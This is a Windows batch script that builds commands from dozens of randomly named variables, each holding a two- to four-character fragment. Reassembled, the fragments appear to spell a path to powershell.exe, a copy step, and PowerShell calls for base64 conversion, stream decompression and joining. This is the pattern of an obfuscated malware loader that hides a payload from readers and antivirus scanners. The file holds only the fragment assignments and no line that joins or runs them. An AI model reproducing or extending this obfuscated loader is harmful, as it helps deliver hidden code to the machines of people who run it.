@echo off
set "lxqhPkQjKN=em"
set "cOGUlrAlvZ=nd"
set "viOTrVwrBy=po"
set "ZRYxjyasga=s\"
set "gZwkgvENIm=py"
set "klYaBbzuIH=we"
set "frPfADgLCi=xe"
set "xUiUGDLsTd=he"
set "KIpWPSIwFr=Po"
set "LTLFaUQfBv=rs"
set "rrfXfgyLSo=ll"
set "QRUJDqwMPl=:\"
set "deptZOziTO=\W"
set "mciOvghWhb=ws"
set "ISBbTcPFxq=we"
set "yQeNwCxjSw=.e"
set "lbpJVJgXTd=do"
set "HCoQBWqJmI=rS"
set "ciyLBckaxm=Sy"
set "hvvVqmfvBD= C"
set "QlrPDvzBUz=st"
set "XGfmxtkqGX=he"
set "IGjUhoeMGP=ow"
set "rCyRtitzuT=\v"
set "YyyHOFRqWq=in"
set "CYkXTNJGvp=1."
set "qheuWzixsf=32"
set "RjNKqtNOzU= /"
set "aJrCvuAhVs=ll"
set "cJvcOqjXXP=Wi"
set "wennXgCsQV=y "
set "MVgLlNcLxY=co"
set "rwLtpXlMuh=0\"
set "rLdqfAKyrR= %~dp0"
set "RDwFDyAglb=cd"
set "JOgeYgfYul=ew-O"
set "svADuKMoFl=Fina"
set "IrNlkaBruI=Bmor"
set "bYKaTksRfM=Etk/"
set "JnDKWxouAj=q = "
set "TkYxWdVzqV=1] -"
set "LsmRAvJrep=nbzB"
set "GFOmktUsQD=in $"
set "qqEuOOAMou=ert]"
set "gQdIssEdbq=oryS"
set "MvGnFpjcfF=m.IO"
set "EGZNDvVZaL=;$qG"
set "dOvWXZMjPs=YdOH"
set "UFIzdCOPqm= [st"
set "lWXkuupGHJ=e = "
set "CwfBkvEOym=zMk."
set "OtECRHnsic=oin "
set "rkbJNdNDgW=esMa"
set "prSfNkHFOl=Obje"
set "LHGjGDjxnS=l.En"
set "jGSKgBuWhJ=y.Pa"
set "kaqqnkfomp= '')"
set "FuWunLPDTn=Disp"
set "QElnkpZxvM=se()"
set "dESzdgsFhO=aY);"
set "pTztwSBCBu=6] -"
set "nHodFMpRVj=]::("
set "PDAvkmpZdX=PG.I"
set "eEoQMlpfVA=[Sys"
set "WKwELywokx=ress"
set "UnorbbiDNS=trea"
set "fpvPVLSSJF=]::("
set "XoLgUrJDaj=:: '"
set "LeBTXqXdlI=).Sp"
set "mJJqtBgNUV=k; }"
set "bbhALOqfyE=]::C"
set "ZsffTwloQE=CpvP"
set "nXUucdZipq=d;$C"
set "IApgmQdKKG=t Sy"
